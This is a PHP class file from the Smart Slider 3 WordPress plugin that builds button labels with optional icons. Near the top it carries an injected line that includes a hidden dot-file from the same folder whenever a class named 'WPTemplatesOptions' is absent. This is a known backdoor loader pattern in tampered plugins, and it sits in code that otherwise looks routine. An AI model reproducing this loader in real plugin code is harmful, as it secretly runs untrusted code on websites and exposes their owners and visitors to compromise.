<?php


namespace Nextend\SmartSlider3\Application\Admin\Layout\Block\Forms\Button;


if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class AbstractButtonLabel extends AbstractButton {

    protected $label = '';

    protected $icon = '';

    protected function getContent() {

        $content = '<span class="' . $this->baseClass . '__label">' . $this->getLabel() . '</span>';

        if (!empty($this->icon)) {
            $content .= '<i class="' . $this->icon . '"></i>';
        }

        return $content;
    }

    /**
     * @return string
     */
    public function getLabel() {
        return $this->label;
    }

    /**
     * @param string $label
     */
    public function setLabel($label) {
        $this->label = $label;
    }

    /**
     * @param string $icon
     */
    public function setIcon($icon) {
        $this->icon = $icon;
    }
}